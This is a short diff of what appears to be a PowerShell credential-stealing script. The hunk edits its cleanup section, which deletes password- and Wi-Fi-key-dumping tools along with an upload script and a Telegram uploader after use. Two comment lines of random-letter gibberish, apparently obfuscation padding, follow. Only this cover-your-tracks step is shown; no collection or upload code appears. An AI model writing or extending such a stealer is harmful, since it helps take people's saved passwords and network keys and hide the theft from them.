@@ -78,7 +78,7 @@ Remove-Item WNetWatcher.exe
 Remove-Item WNetWatcher.cfg
 Remove-Item WirelessKeyView.exe
 Remove-Item WebBrowserPassView.exe
-Remove-Item Harissa_upload.ps1.ps1
+Remove-Item Harissa_upload.ps1
 Remove-Item telegram_uploader.exe
 # OrxDlzTlFiiVpRu nqYfg eNBjorE uLP neiWMrRrk fuGGiFQIOlFRj usjnMMfJvB OKJczSMArLtpc
 #    DjYM isxmlOeOetgd iEiGkRCMqZMKK iGWtHMkSXvtyfAx MyuIwcQ wvLarqwcduaY ZIQAFUPgppMsi SoKsaivVwr
